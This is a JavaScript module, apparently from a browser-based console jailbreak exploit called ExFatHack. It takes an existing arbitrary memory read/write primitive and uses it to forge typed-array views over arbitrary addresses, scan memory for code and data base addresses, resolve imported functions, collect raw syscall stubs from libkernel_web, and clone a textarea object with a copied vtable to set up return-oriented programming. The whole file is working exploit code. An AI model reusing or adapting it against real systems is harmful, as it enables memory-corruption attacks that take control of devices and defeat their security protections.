import { Int } from '/ExFatHack/module/int64.mjs';
import { Addr, mem } from '/ExFatHack/module/mem.mjs';
import { align } from '/ExFatHack/module/utils.mjs';
import { KB, page_size } from '/ExFatHack/module/offset.mjs';
import { read32 } from '/ExFatHack/module/rw.mjs';
import * as rw from '/ExFatHack/module/rw.mjs';
import * as o from '/ExFatHack/module/offset.mjs';

export function make_buffer(addr, size) {
    const u = new Uint8Array(1001);
    const u_addr = mem.addrof(u);
    const old_addr = u_addr.read64(o.view_m_vector);
    const old_size = u_addr.read32(o.view_m_length);
    u_addr.write64(o.view_m_vector, addr);
    u_addr.write32(o.view_m_length, size);
    const copy = new Uint8Array(u.length);
    copy.set(u);
    const res = copy.buffer;
    u_addr.write64(o.view_m_vector, old_addr);
    u_addr.write32(o.view_m_length, old_size);
    return res;
}

function check_magic_at(p, is_text) {
    const text_magic = [
        new Int([0x55, 0x48, 0x89, 0xe5, 0x41, 0x57, 0x41, 0x56]),
        new Int([0x41, 0x55, 0x41, 0x54, 0x53, 0x50, 0x48, 0x8d]),
    ];
    const data_magic = [
        new Int(0x20),
        new Int(0x3c13f4bf, 0x2),
    ];
    const magic = is_text ? text_magic : data_magic;
    const value = [p.read64(0), p.read64(8)];

    return value[0].eq(magic[0]) && value[1].eq(magic[1]);
}
export function find_base(addr, is_text, is_back) {
    addr = align(addr, page_size);
    const offset = (is_back ? -1 : 1) * page_size;
    while (true) {
        if (check_magic_at(addr, is_text)) {
            break;
        }
        addr = addr.add(offset)
    }
    return addr;
}

export function get_view_vector(view) {
    if (!ArrayBuffer.isView(view)) {
        throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
    }
    return mem.addrof(view).readp(o.view_m_vector);
}

export function resolve_import(import_addr) {
    if (import_addr.read16(0) !== 0x25ff) {
        throw Error(
            `instruction at ${import_addr} is not of the form: jmp qword`
            + ' [rip + X]'
        );
    }
    const disp = import_addr.read32(2);
    const offset = new Int(disp, disp >> 31);
    const function_addr = import_addr.readp(offset.add(6));
    return function_addr;
}

export function init_syscall_array(
    syscall_array,
    libkernel_web_base,
    max_search_size,
) {
    if (!Number.isInteger(max_search_size)) {
        throw TypeError(
            `max_search_size is not a integer: ${max_search_size}`
        );
    }
    if (max_search_size < 0) {
        throw Error(`max_search_size is less than 0: ${max_search_size}`);
    }
    const libkernel_web_buffer = make_buffer(
        libkernel_web_base,
        max_search_size,
    );
    const kbuf = new Uint8Array(libkernel_web_buffer);
    let text_size = 0;
    let found = false;
    for (let i = 0; i < max_search_size; i++) {
        if (kbuf[i] === 0x72
            && kbuf[i + 1] === 0x64
            && kbuf[i + 2] === 0x6c
            && kbuf[i + 3] === 0x6f
        ) {
            text_size = i;
            found = true;
            break;
        }
    }
    if (!found) {
        throw Error(
            '"rdlo" string not found in libkernel_web, base address:'
            + ` ${libkernel_web_base}`
        );
    }

    for (let i = 0; i < text_size; i++) {
        if (kbuf[i] === 0x48
            && kbuf[i + 1] === 0xc7
            && kbuf[i + 2] === 0xc0
            && kbuf[i + 7] === 0x49
            && kbuf[i + 8] === 0x89
            && kbuf[i + 9] === 0xca
            && kbuf[i + 10] === 0x0f
            && kbuf[i + 11] === 0x05
        ) {
            const syscall_num = read32(kbuf, i + 3);
            syscall_array[syscall_num] = libkernel_web_base.add(i);
            i += 11;
        }
    }
}

const rop_ta = document.createElement('textarea');

export function create_ta_clone(obj) {
    const js_size = 0x10;
    const offset_js_inline_prop = 0x10;
    const vtable_size = 0x1000;
    const webcore_ta_size = 0x180;
    const ta_clone = {};
    obj.ta_clone = ta_clone;
    const clone_p = mem.addrof(ta_clone);
    const ta_p = mem.addrof(rop_ta);
    for (let i = js_size; i < o.size_jsta; i += 8) {
        clone_p.write64(i, ta_p.read64(i));
    }
    const webcore_ta = ta_p.readp(o.jsta_impl);
    const m_wrapped_clone = new Uint8Array(
        make_buffer(webcore_ta, webcore_ta_size)
    );
    obj.m_wrapped_clone = m_wrapped_clone;
    const vtable_clone = new Uint8Array(
        make_buffer(webcore_ta.readp(0), vtable_size)
    );
    obj.vtable_clone = vtable_clone
    clone_p.write64(
        o.jsta_impl,
        get_view_vector(m_wrapped_clone),
    );
    rw.write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));
    clone_p.write64(0, ta_p.read64(0));
    return clone_p;
}